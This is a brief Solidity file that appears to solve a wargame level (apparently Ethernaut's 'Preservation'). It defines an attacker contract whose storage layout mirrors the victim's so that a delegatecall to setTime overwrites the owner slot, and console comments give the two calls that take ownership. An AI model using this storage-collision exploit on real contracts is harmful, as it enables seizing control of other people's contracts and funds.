pragma solidity ^0.4.23;

contract BadLibraryContract {
    address public timeZone1Library; // SLOT 0
    address public timeZone2Library; // SLOT 1
    address public owner;            // SLOT 2
    uint storedTime;                 // SLOT 3

     function setTime(uint _time) public {
        owner = msg.sender;
    }
}

// in console
// await contract.setFirstTime("[BadLibraryContract Addr]")

// await contract.setFirstTime(1)